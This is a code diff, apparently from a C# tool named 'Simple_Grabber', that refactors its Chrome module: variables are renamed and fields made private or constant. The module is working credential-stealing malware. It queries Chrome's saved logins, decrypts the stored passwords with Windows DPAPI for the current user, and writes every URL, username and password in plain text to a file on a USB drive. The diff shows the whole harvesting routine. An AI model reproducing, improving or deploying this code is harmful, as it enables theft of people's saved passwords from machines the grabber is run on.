@@ -10,18 +10,18 @@ namespace Simple_Grabber.Modules
 {
     public class User
     {
-        public string Action_url { get; set; }
+        public string ActionUrl { get; set; }
 
-        public string Username_value { get; set; }
+        public string UsernameValue { get; set; }
 
-        public byte[] Password_value { get; set; }
+        public byte[] PasswordValue { get; set; }
     }
 
     public class Chrome
     {
         // Default file path for the database
 
-        public static string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
+        private static readonly string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
         
         // Get the entries within the database
 
@@ -47,7 +47,7 @@ namespace Simple_Grabber.Modules
             {
                 // Query used to get the database entries
 
-                var statement = "SELECT action_url, username_value, password_value FROM logins";
+                const string statement = "SELECT action_url, username_value, password_value FROM logins";
 
                 // Open the database
 
@@ -61,9 +61,9 @@ namespace Simple_Grabber.Modules
                 {
                     // Decrypt the password
 
-                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.Password_value, null, DataProtectionScope.CurrentUser));
+                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.PasswordValue, null, DataProtectionScope.CurrentUser));
 
-                    databaseEntries.AppendLine($"{user.Action_url} : {user.Username_value} : {decryptedPassword}");
+                    databaseEntries.AppendLine($"{user.ActionUrl} : {user.UsernameValue} : {decryptedPassword}");
                 }
             }
 
@@ -76,16 +76,16 @@ namespace Simple_Grabber.Modules
 
         // Write the entries to a file
 
-        public static void WriteToFile(string USBPath)
+        public static void WriteToFile(string usbPath)
         {
             var databaseEntries = GetDatabaseEntries();
 
-            if (!File.Exists(USBPath + @"Data\Chrome.txt"))
+            if (!File.Exists(usbPath + @"Data\Chrome.txt"))
             {
-                File.Create(USBPath + @"Data\Chrome.txt");
+                File.Create(usbPath + @"Data\Chrome.txt");
             }
 
-            File.WriteAllText(USBPath + @"Data\Chrome.txt", databaseEntries.ToString());    
+            File.WriteAllText(usbPath + @"Data\Chrome.txt", databaseEntries.ToString());    
         }
     }
 }
